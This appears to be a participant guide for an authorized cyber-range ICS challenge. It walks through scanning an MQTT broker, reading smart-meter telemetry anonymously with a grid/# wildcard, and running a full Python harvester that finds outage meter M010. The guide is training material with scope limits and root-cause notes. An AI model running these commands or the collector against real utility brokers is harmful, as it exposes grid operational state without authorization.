| **RED TEAM EXPLOITATION GUIDE** |
|---------------------------------|

**Smart-Meter Wildcard Harvest**

|     |
|-----|

Anonymous MQTT Access, Cross-Zone Wildcard Collection and Outage Discovery

Challenge type: OT/ICS \| Protocol: MQTT over TCP \| Participant action: Unauthorized wildcard subscription

| **Document field** | **Value** |
|----|----|
| Guide type | Participant-facing Red Team exploitation guide |
| Starting knowledge | Target address and permitted network access only |
| Exposed service | MQTT over TCP/1883 |
| Primary weakness | Anonymous reads with ineffective topic-level authorization |
| Exploit primitive | Multi-level wildcard subscription: grid/# |
| Successful result | 60 topics, 3 zones, 12 meters and outage meter M010 |
| Primary confirmation | HARVEST_RESULT:PASS from the participant script |

*Prepared for authorized cyber-range training*

# **Contents**

1\. Vulnerability Overview

2\. Participant Objective and Scope

3\. Attack Surface and MQTT Trust Model

4\. Exploitation Workflow

5\. Phase 1 - Target Definition

6\. Phase 2 - MQTT Service Discovery

7\. Phase 3 - Anonymous MQTT Read Verification

8\. Phase 4 - Cross-Zone Wildcard Discovery

9\. Phase 5 - Complete Python Exploit Source

10\. Phase 6 - Execute and Confirm the Exploit

11\. Understanding the Vulnerability

12\. MITRE ATT&CK for ICS Mapping

Appendix A - Participant Command Reference

Appendix B - Expected Output Reference

Appendix C - Common Pitfalls

References

Conclusion

# **1. Vulnerability Overview**

The challenge exposes an MQTT broker on TCP/1883. An external client can connect without presenting a username, password or client certificate and can read smart-meter telemetry. The broker also permits the MQTT multi-level wildcard filter grid/#, allowing one subscription to match every topic under the grid hierarchy.

The weakness is not a malformed-packet or memory-corruption exploit. The participant uses valid MQTT behavior in the expected wire format. The security failure is that the broker does not enforce effective authentication and least-privilege topic authorization for operational telemetry.

| Primary vulnerability: unauthenticated MQTT read access combined with an overbroad multi-level wildcard subscription. The participant can reconstruct cross-zone meter state without host access, credentials or message publication. |
|----|

## **1.1 Confirmed Participant-Side Findings**

| **Finding**                | **Observed result**                         |
|----------------------------|---------------------------------------------|
| Remote service             | MQTT available on TCP/1883                  |
| Authentication requirement | No credentials required for telemetry reads |
| Wildcard filter            | grid/# accepted                             |
| Zones exposed              | zone1, zone2 and zone3                      |
| Meters exposed             | M001 through M012                           |
| Topics collected           | 60 operational telemetry topics             |
| Outage identified          | M010 on FEEDER-SOUTH-A                      |
| Participant success marker | HARVEST_RESULT:PASS                         |

# **2. Participant Objective and Scope**

The objective is to discover the participant-facing MQTT service, confirm anonymous read access, identify the smart-meter topic structure, exploit the broad wildcard subscription and determine which meter reports an outage. All actions are performed from the assigned Kali system against the supplied target address.

## **2.1 Starting Conditions**

- The participant receives the target IP address.

- No MQTT username, password, client certificate or broker configuration is provided.

- The participant performs all actions from the assigned Kali system.

- Only externally observable MQTT responses and participant-generated result files are used.

## **2.2 Participant Boundaries**

- Use only the assigned challenge target.

- Keep the exercise read-only: subscribe and receive; do not publish or modify telemetry.

- Do not access the Ubuntu host, service configuration, system logs or packet capture.

- Do not perform administrative, recovery or defensive actions on the target.

- Stop after cross-zone collection and outage-meter identification are confirmed.

# **3. Attack Surface and MQTT Trust Model**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>External participant Kali host<br />
|<br />
| MQTT 3.1.1 over TCP/1883<br />
| CONNECT client ID: zone1-maint-laptop-07<br />
| SUBSCRIBE topic filter: grid/#<br />
v<br />
Participant-facing MQTT broker<br />
|<br />
+--&gt; grid/zone1/meter/M001-M004/&lt;field&gt;<br />
+--&gt; grid/zone2/meter/M005-M008/&lt;field&gt;<br />
+--&gt; grid/zone3/meter/M009-M012/&lt;field&gt;<br />
<br />
Fields: id | feeder | load | voltage | outage</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

The client identifier is participant-selected metadata and does not prove authorization. The broker accepts the connection and subscription even though the client has no supplied identity credentials or zone-specific read permission.

## **3.1 Relevant MQTT Elements**

| **Element** | **Role in the exploit** |
|----|----|
| TCP/1883 | Participant-facing MQTT transport endpoint |
| CONNECT | Establishes a client session using the chosen client identifier |
| Client ID | Labels the session but does not authenticate the participant |
| SUBSCRIBE | Requests delivery for a Topic Filter |
| grid/# | Matches all remaining topic levels below grid/ |
| Retained messages | Provide the current value of each meter field immediately |
| PUBLISH delivery | Returns the matched telemetry to the subscriber |

# **4. Exploitation Workflow**

1.  Record the supplied target address and expected MQTT port.

2.  Perform a focused TCP scan and identify MQTT on port 1883.

3.  Request one known meter topic without credentials.

4.  Subscribe to grid/# and enumerate the cross-zone topic hierarchy.

5.  Create the complete Python wildcard collector.

6.  Run the collector and require 3 zones, 12 meters and one outage record.

7.  Review the structured result and identify the outage meter.

| Success condition: the participant-side collector reports HARVEST_RESULT:PASS, ZONES=3, METERS=12, OUTAGE_METER=M010 and OUTAGE_ZONE=zone3. |
|----|

# **5. Phase 1 - Target Definition**

Use the address supplied by the evaluator. The public address visible in the screenshots belongs to one test environment and must not be treated as a fixed challenge value.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>cd ~/smart-meter-demo<br />
<br />
export TARGET="&lt;TARGET-IP&gt;"<br />
export MQTT_PORT="1883"<br />
<br />
echo "TARGET=$TARGET"<br />
echo "MQTT_PORT=$MQTT_PORT"<br />
echo "ASSESSMENT_TYPE=EXTERNAL_PARTICIPANT"</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

Recording the target before execution prevents commands from being sent to an unintended host and keeps the remaining procedure portable between deployments.

# **6. Phase 2 - MQTT Service Discovery**

Perform a focused scan against the expected MQTT port. The scan confirms reachability and identifies the application protocol without introducing broad or unrelated traffic.

| nmap -n -Pn -sV -p 1883 "\$TARGET" |
|------------------------------------|

<img src=".\Red-Writeup-assets/media/image5.png" style="width:6.5in;height:2.49419in" />

*Figure 1 - TCP/1883 was reachable and identified as MQTT from the participant Kali host.*

## **6.1 Interpretation**

| **Output** | **Meaning** |
|----|----|
| 1883/tcp open | A TCP connection can be established to the participant-facing service |
| mqtt | The service behavior matches MQTT |
| Host is up | The assigned target responds over the permitted path |

# **7. Phase 3 - Anonymous MQTT Read Verification**

Before requesting the full grid hierarchy, test one known telemetry topic without supplying credentials. This establishes that the issue is not merely service exposure; the broker is returning operational data to an anonymous client.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>mosquitto_sub \<br />
-h "$TARGET" \<br />
-p 1883 \<br />
-i participant-recon \<br />
-t 'grid/zone1/meter/M001/id' \<br />
-v \<br />
-C 1 \<br />
-W 8</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src=".\Red-Writeup-assets/media/image6.png" style="width:4.7in;height:4.3302in" />

*Figure 2 - An unauthenticated subscription returned the identity value for meter M001.*

## **7.1 Why This Confirms Anonymous Read Access**

- No username or password option was supplied to mosquitto_sub.

- No client certificate or TLS identity was presented.

- The broker accepted the subscription request.

- The broker returned the operational value M001.

# **8. Phase 4 - Cross-Zone Wildcard Discovery**

MQTT Topic Filters can include wildcard characters. The multi-level wildcard \# matches every remaining level below its position. Therefore, grid/# requests all topics beneath the grid hierarchy.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>mosquitto_sub \<br />
-h "$TARGET" \<br />
-p 1883 \<br />
-i zone1-maint-laptop-07 \<br />
-t 'grid/#' \<br />
-v \<br />
-C 60 \<br />
-W 10 \<br />
| grep -E '/id ' \<br />
| sort</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src=".\Red-Writeup-assets/media/image7.png" style="width:6.4in;height:2.81362in" />

*Figure 3 - One wildcard subscription exposed meter identities from zone1, zone2 and zone3.*

## **8.1 Topic Structure**

| grid/\<zone\>/meter/\<meter-id\>/\<field\> |
|--------------------------------------------|

| **Topic level** | **Observed values**               |
|-----------------|-----------------------------------|
| Zone            | zone1, zone2, zone3               |
| Meter ID        | M001 through M012                 |
| Field           | id, feeder, load, voltage, outage |

The 60-topic result follows directly from 3 zones × 4 meters per zone × 5 fields per meter. The broad subscription defeats the intended zone separation and exposes operational state across the entire hierarchy.

# **9. Phase 5 - Complete Python Exploit Source**

The following is the complete participant-side source for wildcard_harvest.py. It performs a genuine MQTT 3.1.1 connection, subscribes to grid/#, records each received message, reconstructs complete meter records and identifies the meter whose outage field is true.

| Participant tool requirement: Python 3 with paho-mqtt 2.1.0. The script is read-only and never publishes a message. |
|----|

## **9.1 Imports, Topic Parser and Arguments**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>#!/usr/bin/env python3<br />
"""Collect cross-zone smart-meter telemetry through an overbroad MQTT wildcard."""<br />
<br />
from __future__ import annotations<br />
<br />
import argparse<br />
import json<br />
import threading<br />
import time<br />
from datetime import datetime, timezone<br />
from pathlib import Path<br />
<br />
import paho.mqtt.client as mqtt<br />
<br />
<br />
EXPECTED_FIELDS = {"id", "feeder", "load", "voltage", "outage"}<br />
<br />
<br />
def utc_now() -&gt; str:<br />
"""Return an ISO-8601 UTC timestamp."""<br />
return datetime.now(timezone.utc).isoformat()<br />
<br />
<br />
def parse_meter_topic(topic: str) -&gt; tuple[str, str, str] | None:<br />
"""Parse grid/&lt;zone&gt;/meter/&lt;meter-id&gt;/&lt;field&gt; topics."""<br />
parts = topic.split("/")<br />
<br />
if len(parts) != 5:<br />
return None<br />
<br />
if parts[0] != "grid" or parts[2] != "meter":<br />
return None<br />
<br />
zone = parts[1]<br />
meter_id = parts[3]<br />
field = parts[4]<br />
<br />
if not zone or not meter_id or field not in EXPECTED_FIELDS:<br />
return None<br />
<br />
return zone, meter_id, field<br />
<br />
<br />
def build_arguments() -&gt; argparse.Namespace:<br />
parser = argparse.ArgumentParser(<br />
description=(<br />
"Collect smart-meter telemetry through an overbroad MQTT "<br />
"multi-level wildcard subscription."<br />
)<br />
)<br />
parser.add_argument("--broker", required=True, help="MQTT broker IP or hostname")<br />
parser.add_argument("--port", type=int, default=1883, help="MQTT TCP port")<br />
parser.add_argument(<br />
"--client-id",<br />
default="zone1-maint-laptop-07",<br />
help="Participant-selected MQTT client identifier",<br />
)<br />
parser.add_argument(<br />
"--topic-filter",<br />
default="grid/#",<br />
help="MQTT subscription filter",<br />
)<br />
parser.add_argument(<br />
"--timeout",<br />
type=float,<br />
default=30.0,<br />
help="Maximum collection duration in seconds",<br />
)<br />
parser.add_argument(<br />
"--expected-zones",<br />
type=int,<br />
default=3,<br />
help="Expected number of grid zones",<br />
)<br />
parser.add_argument(<br />
"--expected-meters",<br />
type=int,<br />
default=12,<br />
help="Expected number of unique meters",<br />
)<br />
parser.add_argument(<br />
"--output",<br />
default="./wildcard-harvest.json",<br />
help="Structured result file",<br />
)<br />
parser.add_argument(<br />
"--messages-output",<br />
default="./wildcard-messages.jsonl",<br />
help="Raw received-message result file",<br />
)<br />
return parser.parse_args()</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

## **9.2 Connection, Subscription and Message Collection**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>def main() -&gt; int:<br />
args = build_arguments()<br />
<br />
output_path = Path(args.output)<br />
messages_path = Path(args.messages_output)<br />
output_path.parent.mkdir(parents=True, exist_ok=True)<br />
messages_path.parent.mkdir(parents=True, exist_ok=True)<br />
output_path.unlink(missing_ok=True)<br />
messages_path.unlink(missing_ok=True)<br />
<br />
connected = threading.Event()<br />
subscribed = threading.Event()<br />
collection_complete = threading.Event()<br />
<br />
records: list[dict[str, object]] = []<br />
meter_facts: dict[str, dict[str, str]] = {}<br />
first_message_utc: str | None = None<br />
last_message_utc: str | None = None<br />
started_at_utc = utc_now()<br />
<br />
def on_connect(client, userdata, flags, reason_code, properties) -&gt; None:<br />
if reason_code != 0:<br />
print(f"[-] MQTT connection failed: reason={reason_code}", flush=True)<br />
collection_complete.set()<br />
return<br />
<br />
connected.set()<br />
print(<br />
f"[+] Connected to {args.broker}:{args.port} "<br />
f"as client ID {args.client_id}",<br />
flush=True,<br />
)<br />
<br />
result, _message_id = client.subscribe(args.topic_filter, qos=0)<br />
if result != mqtt.MQTT_ERR_SUCCESS:<br />
print(f"[-] Subscription request failed: rc={result}", flush=True)<br />
collection_complete.set()<br />
return<br />
<br />
print(f"[+] Requested subscription: {args.topic_filter}", flush=True)<br />
<br />
def on_subscribe(client, userdata, message_id, reason_codes, properties) -&gt; None:<br />
subscribed.set()<br />
print(f"[+] Subscription acknowledged: {args.topic_filter}", flush=True)<br />
<br />
def on_message(client, userdata, message) -&gt; None:<br />
nonlocal first_message_utc, last_message_utc<br />
<br />
timestamp = utc_now()<br />
payload = message.payload.decode("utf-8", errors="replace")<br />
parsed = parse_meter_topic(message.topic)<br />
<br />
record = {<br />
"timestamp_utc": timestamp,<br />
"client_id": args.client_id,<br />
"topic_filter": args.topic_filter,<br />
"topic": message.topic,<br />
"payload": payload,<br />
"qos": message.qos,<br />
"retain": message.retain,<br />
}<br />
records.append(record)<br />
<br />
with messages_path.open("a", encoding="utf-8") as handle:<br />
handle.write(json.dumps(record, sort_keys=True) + "\n")<br />
<br />
if first_message_utc is None:<br />
first_message_utc = timestamp<br />
last_message_utc = timestamp<br />
<br />
if parsed:<br />
zone, meter_id, field = parsed<br />
key = f"{zone}/{meter_id}"<br />
meter_facts.setdefault(key, {"zone": zone, "meter_id": meter_id})<br />
meter_facts[key][field] = payload<br />
<br />
complete_meters = [<br />
facts<br />
for facts in meter_facts.values()<br />
if EXPECTED_FIELDS.issubset(facts.keys())<br />
]<br />
if len(complete_meters) &gt;= args.expected_meters:<br />
collection_complete.set()</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

## **9.3 Result Construction and Exploit Decision Logic**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>client = mqtt.Client(<br />
callback_api_version=mqtt.CallbackAPIVersion.VERSION2,<br />
client_id=args.client_id,<br />
clean_session=True,<br />
protocol=mqtt.MQTTv311,<br />
)<br />
client.on_connect = on_connect<br />
client.on_subscribe = on_subscribe<br />
client.on_message = on_message<br />
<br />
try:<br />
client.connect(args.broker, args.port, keepalive=30)<br />
except Exception as exc:<br />
print(f"[-] Broker connection failed: {exc}", flush=True)<br />
return 1<br />
<br />
client.loop_start()<br />
deadline = time.monotonic() + args.timeout<br />
<br />
try:<br />
while time.monotonic() &lt; deadline:<br />
if collection_complete.wait(timeout=0.25):<br />
break<br />
except KeyboardInterrupt:<br />
print("[-] Collection interrupted by participant", flush=True)<br />
finally:<br />
try:<br />
client.disconnect()<br />
finally:<br />
client.loop_stop()<br />
<br />
zones = sorted({facts["zone"] for facts in meter_facts.values()})<br />
meters = sorted({facts["meter_id"] for facts in meter_facts.values()})<br />
<br />
complete_meter_facts = sorted(<br />
[<br />
facts<br />
for facts in meter_facts.values()<br />
if EXPECTED_FIELDS.issubset(facts.keys())<br />
],<br />
key=lambda item: (item["zone"], item["meter_id"]),<br />
)<br />
<br />
outage_meters = sorted(<br />
[<br />
{<br />
"zone": facts["zone"],<br />
"meter_id": facts["meter_id"],<br />
"feeder": facts["feeder"],<br />
"load": facts["load"],<br />
"voltage": facts["voltage"],<br />
"outage": facts["outage"],<br />
}<br />
for facts in complete_meter_facts<br />
if facts.get("outage", "").lower() == "true"<br />
],<br />
key=lambda item: item["meter_id"],<br />
)<br />
<br />
result = {<br />
"challenge": "Smart-Meter Wildcard Harvest",<br />
"started_at_utc": started_at_utc,<br />
"completed_at_utc": utc_now(),<br />
"first_message_utc": first_message_utc,<br />
"last_message_utc": last_message_utc,<br />
"broker": args.broker,<br />
"port": args.port,<br />
"client_id": args.client_id,<br />
"topic_filter": args.topic_filter,<br />
"message_count": len(records),<br />
"unique_topic_count": len({record["topic"] for record in records}),<br />
"zones": zones,<br />
"zone_count": len(zones),<br />
"meters": meters,<br />
"meter_count": len(meters),<br />
"meter_facts": complete_meter_facts,<br />
"outage_meters": outage_meters,<br />
}<br />
<br />
output_path.write_text(<br />
json.dumps(result, indent=2, sort_keys=True) + "\n",<br />
encoding="utf-8",<br />
)<br />
<br />
print(<br />
f"[+] Collected {len(records)} messages across "<br />
f"{len(zones)} zones and {len(meters)} meters",<br />
flush=True,<br />
)<br />
<br />
for outage in outage_meters:<br />
print(<br />
"[+] Outage meter: "<br />
f"ZONE={outage['zone']} "<br />
f"METER={outage['meter_id']} "<br />
f"FEEDER={outage['feeder']} "<br />
f"LOAD={outage['load']} "<br />
f"VOLTAGE={outage['voltage']}",<br />
flush=True,<br />
)<br />
<br />
print(f"[+] Results written to {output_path}", flush=True)<br />
<br />
valid = (<br />
connected.is_set()<br />
and subscribed.is_set()<br />
and args.topic_filter == "grid/#"<br />
and len(zones) == args.expected_zones<br />
and len(meters) == args.expected_meters<br />
and len(complete_meter_facts) == args.expected_meters<br />
and len(outage_meters) == 1<br />
)<br />
<br />
if valid:<br />
outage = outage_meters[0]<br />
print(<br />
"HARVEST_RESULT:PASS "<br />
f"CLIENT_ID={args.client_id} "<br />
f"FILTER={args.topic_filter} "<br />
f"ZONES={len(zones)} "<br />
f"METERS={len(meters)} "<br />
f"OUTAGE_METER={outage['meter_id']} "<br />
f"OUTAGE_ZONE={outage['zone']}"<br />
)<br />
return 0<br />
<br />
print(<br />
"HARVEST_RESULT:FAIL "<br />
f"ZONES={len(zones)} "<br />
f"METERS={len(meters)} "<br />
f"OUTAGES={len(outage_meters)}"<br />
)<br />
return 1<br />
<br />
<br />
if __name__ == "__main__":<br />
raise SystemExit(main())</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

## **9.4 What the Script Does**

- Connects to the supplied broker over MQTT 3.1.1.

- Uses the participant-selected client ID zone1-maint-laptop-07.

- Requests the multi-level wildcard filter grid/#.

- Parses only grid/\<zone\>/meter/\<meter-id\>/\<field\> telemetry.

- Waits until all five expected fields are available for 12 meters.

- Writes a structured JSON result and a JSONL message list.

- Returns exit code 0 only when the complete cross-zone result and one outage record are present.

# **10. Phase 6 - Execute and Confirm the Exploit**

Save the complete source as wildcard_harvest.py, check its Python syntax and execute it against the assigned target.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>python3 -m py_compile wildcard_harvest.py<br />
<br />
python3 wildcard_harvest.py \<br />
--broker "$TARGET" \<br />
--port 1883 \<br />
--client-id zone1-maint-laptop-07 \<br />
--topic-filter 'grid/#' \<br />
--timeout 30 \<br />
--expected-meters 12 \<br />
--output ./wildcard-harvest.json \<br />
--messages-output ./wildcard-messages.jsonl</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src=".\Red-Writeup-assets/media/image8.png" style="width:6.5in;height:1.36544in" />

*Figure 4 - The wildcard collector received 60 messages across three zones and 12 meters.*

## **10.1 Required Success Output**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>[+] Connected to &lt;TARGET-IP&gt;:1883 as client ID zone1-maint-laptop-07<br />
[+] Requested subscription: grid/#<br />
[+] Subscription acknowledged: grid/#<br />
[+] Collected 60 messages across 3 zones and 12 meters<br />
[+] Outage meter: ZONE=zone3 METER=M010 FEEDER=FEEDER-SOUTH-A LOAD=0.0 VOLTAGE=0.0<br />
HARVEST_RESULT:PASS CLIENT_ID=zone1-maint-laptop-07 FILTER=grid/# ZONES=3 METERS=12 OUTAGE_METER=M010 OUTAGE_ZONE=zone3</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

The PASS decision requires both protocol success and the expected operational result. A connection alone is insufficient. The script must receive the complete meter set across all three zones and identify exactly one outage record.

## **10.2 Review the Cross-Zone Result**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>python3 - &lt;&lt;'PY'<br />
import json<br />
<br />
with open("wildcard-harvest.json", encoding="utf-8") as handle:<br />
data = json.load(handle)<br />
<br />
print("===== WILDCARD HARVEST SUMMARY =====")<br />
print(f"TARGET={data['broker']}:{data['port']}")<br />
print(f"CLIENT_ID={data['client_id']}")<br />
print(f"TOPIC_FILTER={data['topic_filter']}")<br />
print(f"MESSAGES_COLLECTED={data['message_count']}")<br />
print(f"UNIQUE_TOPICS={data['unique_topic_count']}")<br />
print(f"ZONES_DISCOVERED={data['zone_count']}")<br />
print(f"ZONE_LIST={','.join(data['zones'])}")<br />
print(f"METERS_DISCOVERED={data['meter_count']}")<br />
print(f"METER_LIST={','.join(data['meters'])}")<br />
print("CROSS_ZONE_HARVEST:PASS")<br />
PY</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src=".\Red-Writeup-assets/media/image9.png" style="width:6in;height:1.94649in" />

*Figure 5 - The participant result confirms 60 unique topics, three zones and 12 meters.*

## **10.3 Identify the Outage Meter**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>python3 - &lt;&lt;'PY'<br />
import json<br />
<br />
with open("wildcard-harvest.json", encoding="utf-8") as handle:<br />
data = json.load(handle)<br />
<br />
print("===== OUTAGE METER IDENTIFICATION =====")<br />
outages = data.get("outage_meters", [])<br />
if not outages:<br />
print("OUTAGE_METER_FOUND=false")<br />
raise SystemExit(1)<br />
<br />
for meter in outages:<br />
print(f"ZONE={meter['zone']}")<br />
print(f"METER_ID={meter['meter_id']}")<br />
print(f"FEEDER={meter['feeder']}")<br />
print(f"LOAD={meter['load']}")<br />
print(f"VOLTAGE={meter['voltage']}")<br />
print(f"OUTAGE={meter['outage']}")<br />
<br />
print("OUTAGE_METER_FOUND=true")<br />
print("SMART_METER_OUTAGE_DISCOVERY:PASS")<br />
PY</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src=".\Red-Writeup-assets/media/image10.png" style="width:5.2in;height:1.76604in" />

*Figure 6 - M010 in zone3 on FEEDER-SOUTH-A is the meter reporting an outage.*

# **11. Understanding the Vulnerability**

## **11.1 Root Cause**

- The participant-facing broker accepts a connection without supplied identity credentials.

- The broker permits reads from operational smart-meter topics.

- The broker does not effectively restrict the client to one assigned zone.

- The broad Topic Filter grid/# is accepted and matched against all grid telemetry.

- Retained values make the current state immediately available after subscription.

## **11.2 Why the Exploit Works**

The exploit uses legitimate MQTT features rather than corrupting the service. The client sends a normal CONNECT followed by a normal SUBSCRIBE request. The security boundary fails because the broker authorizes a broad read that should have been rejected or narrowed to an approved zone-specific branch.

The chosen client identifier resembles a maintenance endpoint, but it is only a participant-controlled string. The exploit succeeds because the broker does not require proof that the participant owns or is authorized to use that identity.

## **11.3 Security Impact**

| **Risk factor** | **Assessment** |
|----|----|
| Authentication | Unauthenticated telemetry reads are accepted |
| Authorization | No effective least-privilege topic restriction |
| Operational visibility | Three zones and 12 meter identities exposed |
| Process-state disclosure | Load, voltage, feeder and outage state disclosed |
| Target profiling | Operational hierarchy can be reconstructed remotely |
| Direct process modification | Not required for successful exploitation |

| The challenge demonstrates confidentiality and operational-intelligence impact. The participant does not need to publish a command or alter process state to obtain sensitive cross-zone information. |
|----|

# **12. MITRE ATT&CK for ICS Mapping**

| **Mapping** | **Technique** | **Presence in this challenge** |
|----|----|----|
| TA0100 - Collection | T0802 - Automated Collection | A script automatically collects industrial environment information across multiple smart-meter topics. |

The mapping focuses on the automated collection behavior demonstrated by the Python subscriber. Reconnaissance and topic enumeration support the solve path, while the central participant outcome is systematic collection of operational ICS information.

# **Appendix A - Participant Command Reference**

| **Task** | **Command** |
|----|----|
| Set target | export TARGET="\<TARGET-IP\>" |
| Focused scan | nmap -n -Pn -sV -p 1883 "\$TARGET" |
| Anonymous read | mosquitto_sub -h "\$TARGET" -p 1883 -i participant-recon -t 'grid/zone1/meter/M001/id' -v -C 1 -W 8 |
| Cross-zone discovery | mosquitto_sub -h "\$TARGET" -p 1883 -i zone1-maint-laptop-07 -t 'grid/#' -v -C 60 -W 10 |
| Syntax check | python3 -m py_compile wildcard_harvest.py |
| Execute exploit | python3 wildcard_harvest.py --broker "\$TARGET" --port 1883 --client-id zone1-maint-laptop-07 --topic-filter 'grid/#' --timeout 30 --expected-meters 12 |

# **Appendix B - Expected Output Reference**

## **B.1 MQTT Reconnaissance**

| 1883/tcp open mqtt |
|--------------------|

## **B.2 Anonymous Read**

| grid/zone1/meter/M001/id M001 |
|-------------------------------|

## **B.3 Cross-Zone Collection**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>MESSAGES_COLLECTED=60<br />
UNIQUE_TOPICS=60<br />
ZONES_DISCOVERED=3<br />
ZONE_LIST=zone1,zone2,zone3<br />
METERS_DISCOVERED=12<br />
CROSS_ZONE_HARVEST:PASS</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

## **B.4 Outage Finding**

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr>
<th>ZONE=zone3<br />
METER_ID=M010<br />
FEEDER=FEEDER-SOUTH-A<br />
LOAD=0.0<br />
VOLTAGE=0.0<br />
OUTAGE=true<br />
SMART_METER_OUTAGE_DISCOVERY:PASS</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

# **Appendix C - Common Pitfalls**

- Treating the screenshot address as a permanent target instead of using the evaluator-supplied address.

- Omitting -v from mosquitto_sub and therefore losing the topic name needed for hierarchy analysis.

- Using grid/+ instead of grid/#; + matches only one topic level and will not traverse the complete hierarchy.

- Stopping after one returned topic instead of proving access across all three zones.

- Running the Python script without the paho-mqtt package available.

- Calling the exploit successful without HARVEST_RESULT:PASS and the M010 outage finding.

- Publishing MQTT messages; this exercise is intentionally read-only.

# **References**

- OASIS. MQTT Version 3.1.1, Topic Names and Topic Filters.

- Eclipse Mosquitto. mosquitto_sub command-line subscriber documentation.

- Eclipse Paho. MQTT Python Client documentation.

- MITRE ATT&CK for ICS. T0802 - Automated Collection.

- MITRE ATT&CK for ICS. TA0100 - Collection.

# **Conclusion**

Starting with only the assigned target address, the participant identified MQTT on TCP/1883, confirmed that a telemetry topic could be read without credentials and demonstrated that the multi-level wildcard grid/# exposed the complete grid hierarchy.

The automated collector received 60 topics covering three zones and 12 smart meters. The result identified meter M010 in zone3 on FEEDER-SOUTH-A as the outage meter, with load and voltage both reported as 0.0.

| Participant success principle: external MQTT access, accepted grid/# subscription, complete cross-zone collection and correct M010 outage identification must all be demonstrated from the participant side. |
|----|
